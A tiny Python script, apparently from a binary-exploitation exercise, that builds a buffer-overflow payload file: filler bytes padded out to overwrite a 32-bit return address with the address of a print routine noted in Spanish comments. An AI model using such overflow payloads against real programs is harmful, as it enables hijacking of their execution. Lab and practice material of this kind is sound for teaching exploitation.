# 0xffffc4d4 // first read
# 0xffffc4d8 // second read
# 0x080484f1 // Direccion del print

f = open('asd2.txt', 'wb+')
f.write(b'\x02\x04\x00\x80' + b'\xCE\xFA\xC0\xCA' * 1024 + b'AAAA' + b'\xf1\x84\04\x08')
f.close()
